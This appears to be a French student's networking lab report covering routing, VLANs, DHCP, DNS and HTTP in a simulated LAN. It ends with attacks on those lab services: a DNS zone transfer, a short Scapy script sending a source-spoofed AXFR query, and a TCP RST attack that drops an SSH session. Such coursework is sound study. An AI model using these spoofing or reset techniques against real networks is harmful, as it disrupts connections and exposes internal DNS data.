# 3 - La Partie 3.

---

<u>
Sommaire: </u>

- [**Partie I : Setup initial**](./init.md)
    - une topologie simpliste et limitée
    - idéale pour illustrer le routage
    - nulle IRL pour faire des trucs sérieux
- [**Partie II : Router-on-a-stick**](./roas.md)
    - une topologie classico-classiquemeow
    - jusqu'à plusieurs centaines de clients sans soucis
    - facile à conf et à faire évoluer si besoin
- [**Partie III : Services dans le LAN**](./services.md)
    - cool le réseau, mais pour transporter quoi ?
    - DHCP, DNS, HTTP, on rend le LAN un peu utile
- [**Partie IV : Attaquer les services du LAN**](./atk.md)
    - ça sort des tools chelous, ou Scapy c'est mieux
    - on mène des attaques classiques (mais efficaces ?) dans le LAN

---

## Partie 1 :

**Ping d'un client du `LAN1` vers un client dans le `LAN2`**
```
PC1> show ip
NAME
: PC1[1]
IP/MASK : 10.3.1.1/24
GATEWAY : 10.3.1.254
DNS
MAC
00:50:79:66:68:00
LPORT : 10000
RHOST:PORT
127.0.0.1:10000
MTU : 1500

PC1> ping 10.3.2.2
84 bytes from 10.3.2.2 icmp_seq=1 ttl=62 time=41.389 ms
84 bytes from 10.3.2.2 icmp_seq=2 ttl=62 time=38,424 ms 84 bytes from 10.3.2.2 icmp_seq=3 ttl=62 time=33.709 ms
84 bytes from 10.3.2.2 icmp_seq=4 ttl=62 time=29.687 ms
84 bytes from 10.3.2.2 icmp_seq=5 ttl=62 time=23.024 ms
```

Plop ça marche.

**Capture Wireshark ici : [ping_partie1](part1.pcapng)**

**Afficher les adresses MAC des routeurs**
```
R2#show arp
Protocol Address Age (min) Hardware Addr Type Interface
Internet 10,3.12.1 24 c401.05da.0001 ARPA FastEthernet0/0
Internet 10.3.12.2  - c402.060a.0000 ARPA FastEthernet0/0
Internet 10.3.2.2   0  0050.7966.6802 ARPA FastEthernet1/0
Internet 10.3.2.1  17 050.7966.6803 ARPA FastEthernet1/0
Internet 10.3.2.254 - c402.060.0010 ARPA FastEthernet1/0
```

***

**Prouver qu'on a déjà un accès internet sur `r1`**
```
R1#ping 1,1,1,1
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/79/96 ms
```

**Accès internet depuis le `LAN1`**
```
PC1> ping 1.1.1.1

184 bytes from 1.1.1.1 icmp_seq=1 ttl=56 time=35.200 ms
184 bytes from 1.1.1.1 icmp_seq=2 ttl=56 time=24.550 ms
184 bytes from 1.1.1.1 icmp_seq=3 ttl=56 time=32.030 ms
```

**Accès internet depuis le `LAN2`**
```
PC3> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=57 time=45.942 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=57 time=45.630 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=57 time=59.403 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=57 time=62.303 ms
```
---

## Partie 2 :

### A. VLANs
**Test de `ping`**
```
PC1> ping 10.3.1.2

84 bytes from 10.3.1.2 icmp_seq=1 ttl=64 time=2.770 ms
84 bytes from 10.3.1.2 icmp_seq=2 ttl=64 time=2.900 ms
84 bytes from 10.3.1.2 icmp_seq=3 ttl=64 time=3.001 ms
```

### B. Routeur
**Tests de `ping`**
```
R1#ping 10.3.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 45/47/52 ms
R1#ping 10.3.2.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.2.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 36/42/50 ms
R1#ping 10.3.1.2

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.2, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 40/44/50 ms
```

```
PC1> sh ip

NAME        : PC1[1]
IP/MASK     : 10.3.1.1/24
GATEWAY     : 10.3.1.254
DNS         : 
MAC         : 00:50:79:66:68:00
LPORT       : 10008
RHOST:PORT  : 127.0.0.1:10008
MTU         : 1500

PC1> ping 10.3.2.1

84 bytes from 10.3.2.1 icmp_seq=1 ttl=63 time=15.155 ms
84 bytes from 10.3.2.1 icmp_seq=2 ttl=63 time=16.453 ms
84 bytes from 10.3.2.1 icmp_seq=3 ttl=63 time=18.132 ms
```

**Tests de `ping`**
```
R1#ping 1.1.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 72/80/96 ms
```

```
PC1> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=59 time=21.540 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=59 time=28.474 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=59 time=33.391 ms
```

```
PC2> ping 1.1.1.1        

84 bytes from 1.1.1.1 icmp_seq=1 ttl=59 time=30.589 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=59 time=25.398 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=59 time=28.246 ms
```

## Partie 3 :

### A. DHCP
**Prouvez avec un VPCS**
```
PC4> dhcp
DORA IP 10.3.2.10/24 GW 10.3.2.254

PC4> sh ip      

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 1.1.1.1  
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 43054, 43066/21533/37682
DOMAIN NAME : dns.tp2.b2
MAC         : 00:50:79:66:68:03
LPORT       : 10009
RHOST:PORT  : 127.0.0.1:10009
MTU         : 1500

PC4> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=59 time=20.090 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=59 time=19.789 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=59 time=18.732 ms

```

### B. DNS
**Tests résolutions DNS**
```
PC4> dhcp
DORA IP 10.3.2.10/24 GW 10.3.2.254

PC4> sh ip

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 10.3.3.1  
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 42680, 42689/21344/37352
DOMAIN NAME : dns.tp2.b2
MAC         : 00:50:79:66:68:03
LPORT       : 10030
RHOST:PORT  : 127.0.0.1:10030
MTU         : 1500

PC4> ping efrei.fr  
efrei.fr resolved to 51.255.68.208

84 bytes from 51.255.68.208 icmp_seq=1 ttl=59 time=45.600 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=59 time=42.483 ms
84 bytes from 51.255.68.208 icmp_seq=3 ttl=59 time=45.248 ms

PC4> ping dns.tp3.b2 
dns.tp3.b2 resolved to 10.3.3.1

84 bytes from 10.3.3.1 icmp_seq=1 ttl=63 time=18.195 ms
84 bytes from 10.3.3.1 icmp_seq=2 ttl=63 time=18.090 ms
84 bytes from 10.3.3.1 icmp_seq=3 ttl=63 time=20.113 ms
```

**Capture Wireshark**
[Echange DNS](wireshark/dns.pcapng)

### C. HTTP
**Preuve avec un client**
```
root@localhost onelots]# curl web.tp3.b2 | head
<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>


[root@localhost toto]# curl supersite.tp3.b2 | head
<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>
```

### A. DNS
**Faire la requête pour get l'enregistrement AXFR**

```
[onelots@localhost ~]$ dig axfr @dns.tp3.b2 tp3.b2

; <<>> DiG 9.16.23-RH <<>> axfr @dns.tp3.b2 tp3.b2
; (1 server found)
;; global options: +cmd
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
tp3.b2. 86400 IN NS dns.tp3.b2. 
coolsite.tp3.b2. 86400 IN A 10.3.3.4 
dns.tp3.b2. 86400 IN A 10.3.3.1 
meow.tp3.b2. 86400 IN A 10.3.3.6 
prout.tp3.b2. 86400 IN A 10.3.3.5 
supersite.tp3.b2. 86400 IN A 10.3.3.3 
web.tp3.b2. 86400 IN A 10.3.3.2 
web2.tp3.b2. 86400 IN A 10.3.3.4 
web3.tp3.b2. 86400 IN A 10.3.3.5 
web4.tp3.b2. 86400 IN A 10.3.3.6 
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
```

### B. Flood

**Spoof DNS query**
```
from scapy.all import *

answer = sr1(IP(dst="dns.tp3.b2", src="10.3.2.10")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qtype="AXFR", qname="tp3.b2")))

print(answer[DNS].summary())
```

[DNS spoof query](wireshark/dns_flood.pcapng)

### C. TCP
**Mettre en place une attaque TCP RST**
```
[onelots@localhost]# python3 tcp_reset.py
ip src >> 10.3.3.1
ip dst >> 10.3.3.2
port src >> 56100
port dst >> 22
Seq nb >> 2819567537
Ack nb >> 3424985478
[ 3029.781295 ] device enp0s3 entered promiscuous mode
[ 3029.781295 ] device enp0s3 left promiscuous mode
```

```
[onelots@localhost ~]$ aclient_loop: send disconnect: Broken pipe
```

C'est pété = ça a marché

[TCP rst](wireshark/tcp_reset.pcapng)